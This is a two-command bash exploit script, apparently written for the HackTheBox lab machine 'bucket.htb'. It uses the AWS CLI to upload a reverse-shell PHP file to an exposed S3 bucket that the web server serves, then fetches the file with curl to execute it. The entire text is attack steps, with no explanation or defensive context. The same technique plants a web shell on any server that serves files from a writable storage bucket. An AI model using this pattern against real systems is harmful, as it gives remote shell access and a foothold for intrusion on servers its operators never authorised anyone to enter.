#!/bin/bash

aws --endpoint-url http://s3.bucket.htb/ s3 cp revshell.php s3://adserver/shell.php

curl http://bucket.htb/shell.php


